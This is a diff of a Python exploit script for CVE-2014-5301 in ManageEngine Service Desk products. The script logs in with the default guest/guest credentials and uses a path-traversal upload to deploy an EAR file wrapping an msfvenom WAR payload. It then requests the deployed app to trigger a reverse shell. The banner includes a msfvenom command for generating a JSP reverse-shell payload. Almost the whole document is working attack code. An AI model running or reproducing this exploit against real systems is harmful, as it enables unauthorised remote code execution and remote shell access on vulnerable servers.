@@ -8,27 +8,26 @@ import string
 import random
 import time
 
-def make_ear(war, war_app_base, ear_app_base, display_name, ear_file_name):
+def make_ear(war_payload, war_app_base, ear_app_base, display_name, ear_file_name):
+    # Read in the war file created by msfvenom
+    ear = zipfile.ZipFile(ear_file_name + '.ear', "w")
+    #add war file to ear
+    ear.writestr(war_app_base + '.war', war_payload)
 
-	# Read in the war file created by msfvenom
-	ear = zipfile.ZipFile(ear_file_name, "w")
-	#add war file to ear
-	ear.write(war)
-
-	# ... and then we create an EAR file that will contain it.
-	app_xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n"
-	app_xml += '<application>\r\n'
-	app_xml += "<display-name>{}</display-name>\r\n".format(display_name)
-	app_xml += "<module><web><web-uri>{}</web-uri>\r\n".format(war)
-	app_xml += "<context-root>/{}</context-root></web></module></application>".format(ear_app_base)
+    # ... and then we create an EAR file that will contain it.
+    app_xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+    app_xml += "<application>"
+    app_xml += "<display-name>{}</display-name>".format(display_name)
+    app_xml += "<module><web><web-uri>{}</web-uri>".format(war_app_base + '.war')
+    app_xml += "<context-root>/{}</context-root></web></module></application>".format(ear_app_base)
 	
-	ear.writestr('META-INF/application.xml', app_xml)
+    ear.writestr('META-INF/application.xml', app_xml)
 
-	ear.close()
+    ear.close()
 	
 def banner():
 
-	print("""# ManageEngine Multiple Products Authenticated File Upload
+    print("""# ManageEngine Multiple Products Authenticated File Upload
 #
 # [CVE', '2014-5301'],
 # ['OSVDB', '116733'],
@@ -51,88 +50,147 @@ def banner():
 #        been tested successfully in Windows and Linux on several versions.
 #
 # Ported by: Andrea Bruschi
-# Tested on: MS Windows 2008 Server and ManageEngine Service Desk Plus 7.6.0""")
+# Tested on: MS Windows 2008 Server and ManageEngine Service Desk Plus 7.6.0
 
-	print("Usage: script.py file.war host port")
-	print("script.py shell.war 10.11.1.145 8080")
+# payload gen: msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address> LPORT=4444 -f war > shelljsp.war
+
+""")
+
+    print("Usage: script.py file.war host port")
+    print("script.py shell.war 10.11.1.145 8080")
 
 
 def get_cookie(target_uri):
 
-	print("Requesting {}".format(target_uri))
+    print("Requesting {}".format(target_uri))
+    headers = { 'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': None, 'Accept-Encoding': None, 'Accept': None }
+    res = requests.get(target_uri, headers=headers)
+    return res.cookies['JSESSIONID']
 
-	res = requests.get(target_uri)
-	return res.cookies['JSESSIONID']
-	#return res.cookies
 
 def login(target_uri, cookie):
+    
+    print("Attempting login with default credentials: guest/guest");
 
-	target_uri += "j_security_check;jsessionid=" + str(cookie)
-        headers = { 'Content-Type': 'application/x-www-form-urlencoded'  }
-        fields = { 'j_username': 'guest', 'j_password': 'guest', 'logonDomainName': '' }
-	m = MultipartEncoder(fields)
+    target_uri += "j_security_check;jsessionid=" + str(cookie)
+    headers = { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)', 'Connection': None, 'Accept-Encoding': None, 'Accept': None }
+    
+    data = {'j_username': 'guest', 'j_password': 'guest', 'logonDomainName': ''}
 
-	res = requests.post(target_uri, headers=headers, data=m)
-	return cookie, res.url, res.text
+    res = requests.post(target_uri, headers=headers, data=data)
+    return cookie, res.url, res.text, res.status_code
 
 def upload_request(cookie, target_uri, payload_name, payload_str):
 
-    target_uri += "common/FileAttachment.jsp"
-    headers = { 'Connection': None,  'Accept-Encoding': None, 'Accept': None, 'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)', 'Cookie': 'JSESSIONID=' + str(cookie) + ';', 'Content-Type': 'multipart/form-data; boundary=_Part_498_2188160442_704571167' }
+    print("Uploading the payload on the server...");
 
-    upload_path = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(4))
+    b = ''.join(random.choice(string.digits) for _ in range(10))
+
+    target_uri += "common/FileAttachment.jsp"
+    headers = { 'Connection': None,  'Accept-Encoding': None, 'Accept': None, 'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)', 'Cookie': 'JSESSIONID=' + str(cookie) + ';', 'Content-Type': 'multipart/form-data; boundary=_Part_955_395451011_' + b }
+
+    upload_path = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(5))
     rname1 = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(7))
 
-    fields = { rname1: (payload_name, payload_str, 'application/octet-stream', {'Content-Transfer-Encoding': 'binary'}), 'module': upload_path, 'att_desc': ''}
+    # must change every try you make or upload will fail!!!!
+    att_desc = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(20))
+
 
     if '.ear' in payload_name:
+        upload_path = '../../server/default/deploy'
 
-        fields['module'] = '../../server/default/deploy'
+    fields = {rname1: (payload_name, payload_str, 'application/octet-stream', {'Content-Transfer-Encoding': 'binary'}), 'att_desc': att_desc, 'module': upload_path}
 
-    m = MultipartEncoder(fields, boundary='_Part_498_2188160442_704571167')
+    m = MultipartEncoder(fields, boundary='_Part_955_395451011_' + b)
     res = requests.post(target_uri, data=m.to_string(), headers=headers)
-    return cookie, res.text
+    return cookie, res.text, res.status_code
+
+def run_payload(target_uri, ear_app_base, war_app_base, rts7):
+
+    print("Attempting to launch payload in deployed WAR...")
+    headers = { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)', 'Connection': None, 'Accept-Encoding': None, 'Accept': None  }
+
+    target_uri += ear_app_base + "/" + war_app_base + "/" + rts7
+    res = requests.get(target_uri, headers=headers)
+    return res.status_code
 
 
 def main():
 
-	if len(sys.argv) == 4:
+    if len(sys.argv) == 4:
+        war = sys.argv[1]
+        host = sys.argv[2]
+        port = sys.argv[3]
+        
+        rts1 = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(6)) # war_app_base
+        rts2 = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(16)) # ear_app_base
+        rts3 = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(14)) # display_name
+        rts4 = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(16)) # ear_file_name
+        rts5 = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(11)) # multipart 1
+        rts6 = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(11)) # multipart 2
+
+        war_app_base = rts1
+        war = open(sys.argv[1], 'rb')
+        war_payload = war.read()
+        war.close()
+
+        ear_app_base = rts2
+        display_name = rts3
+        ear_file_name = rts4
+        rts7 = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(9))
+
+
+        make_ear(war_payload, war_app_base, ear_app_base, display_name, ear_file_name)
+
+
+        target_uri = "http://" + host + ":" + port + "/"
 		
-		war = sys.argv[1]
-		host = sys.argv[2]
-		port = sys.argv[3]
+
+        cookie, url, text, status = login(target_uri, get_cookie(target_uri))
+
+        if status == 200:
+            print("[+] Login successfull!")
+        else:
+            print("[-] Login failed..")
+            sys.exit(0)
 		
-		war_app_base = war.replace('.war', '')
-		ear_app_base = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(11))
-		display_name = war_app_base
-		ear_file_name = ear_app_base + ".ear"
 
-                make_ear(war, war_app_base, ear_app_base, display_name, ear_file_name)
 
-                target_uri = "http://" + host + ":" + port + "/"
+        #bogus upload 
+        #payload_name = ear_app_base
+        #payload_str = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(9))
+        cookie, text, status = upload_request(cookie, target_uri, rts5, rts6)
+
+
+        #payload uploas
+        payload_name = ear_app_base
+        ear = open(ear_file_name + '.ear', 'rb')
+        ear_file = ear.read()
+        ear.close()
+        cookie, text, status = upload_request(cookie, target_uri, payload_name + '.ear', ear_file)
+
+        if status == 200:
+            print("[+] Payload uploaded successfully!")
+        else:
+            print("[-] Upload gone wrong :/")
+            sys.exit(0)
+
+
+        for i in range(10):
+            if run_payload(target_uri, ear_app_base, war_app_base, rts7) == 200:
+                print("[+] Hurray! Incoming reverse shell!")
+                sys.exit(0)
+                
+            else:
+                rts7 = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(9))
+
+        print("[-] Reverse shell not coming..")
+        print("[+] Try to manually check here: " + target_uri + ear_app_base + "/" + war_app_base + "/" + rts7)
+
 		
-		cookie, url, text = login(target_uri, get_cookie(target_uri))
-		
-		#print(cookie)
-		#print(url)
-		#print(text)
-
-                #bogus upload 
-                payload_name = ear_app_base
-                payload_str = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(9))
-                cookie, text = upload_request(cookie, target_uri, payload_name, payload_str)
-
-
-                #payload uploas
-                payload_str = open(ear_file_name, 'rb')
-                cookie, text = upload_request(cookie, target_uri, payload_name + '.ear', payload_str)
-
-                print(cookie)
-                print(text)
-		
-	else:
-		banner()
+    else:
+        banner()
 		
 
 if __name__ == "__main__":
-	main()
+    main()
